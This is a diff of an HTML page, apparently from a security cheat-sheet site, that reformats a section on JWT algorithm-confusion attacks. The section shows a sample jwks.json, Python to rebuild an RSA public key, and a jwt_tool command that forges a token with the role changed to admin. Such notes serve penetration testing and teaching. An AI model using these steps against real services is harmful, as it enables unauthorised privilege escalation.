@@ -197,18 +197,21 @@
 <div class="content"><hr>
 <h3 id="abuse-1-algorithm-confusion">Abuse #1: Algorithm confusion</h3>
 <h4 id="0-sample-jwksjson">0. Sample jwks.json</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{ 
-</span></span><span class="line"><span class="cl">    &#34;keys&#34;: [
-</span></span><span class="line"><span class="cl">        {
-</span></span><span class="line"><span class="cl">        &#34;kty&#34;: &#34;RSA&#34;,
-</span></span><span class="line"><span class="cl">        &#34;use&#34;: &#34;sig&#34;,
-</span></span><span class="line"><span class="cl">        &#34;alg&#34;: &#34;RS256&#34;,
-</span></span><span class="line"><span class="cl">        &#34;n&#34;: &#34;&lt;BASE64_n&gt;&#34;,
-</span></span><span class="line"><span class="cl">        &#34;e&#34;: &#34;AQAB&#34;
-</span></span><span class="line"><span class="cl">        }
-</span></span><span class="line"><span class="cl">    ]
-</span></span><span class="line"><span class="cl">}
-</span></span></code></pre></div><h4 id="1-create-a-public-key">1. Create a public key</h4>
+<div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;keys&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;kty&#34;</span><span class="p">:</span> <span class="s2">&#34;RSA&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;use&#34;</span><span class="p">:</span> <span class="s2">&#34;sig&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;alg&#34;</span><span class="p">:</span> <span class="s2">&#34;RS256&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;n&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;BASE64_n&gt;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;e&#34;</span><span class="p">:</span> <span class="s2">&#34;AQAB&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div></div>
+<h4 id="1-create-a-public-key">1. Create a public key</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">from base64 import urlsafe_b64decode
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">from Crypto.PublicKey import RSA
@@ -217,11 +220,14 @@
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">key</span> <span class="o">=</span> RSA.construct<span class="o">((</span>n, e<span class="o">))</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Save it to public.pem</span>
 </span></span><span class="line"><span class="cl">print<span class="o">(</span>key.exportKey<span class="o">()</span>.decode<span class="o">())</span>
-</span></span></code></pre></div><h4 id="2-forge-a-jwt">2. Forge a jwt</h4>
-<p><a href="https://github.com/ticarpi/jwt_tool">jwt_tool</a></p>
+</span></span></code></pre></div></div>
+<h4 id="2-forge-a-jwt">2. Forge a jwt</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># For example, modify role to admin</span>
 </span></span><span class="line"><span class="cl">python3 jwt_tool.py -S hs256 -k public.pem -I -pc role -pv admin &lt;JWT&gt;
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://github.com/ticarpi/jwt_tool">jwt_tool</a></em></small></p>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
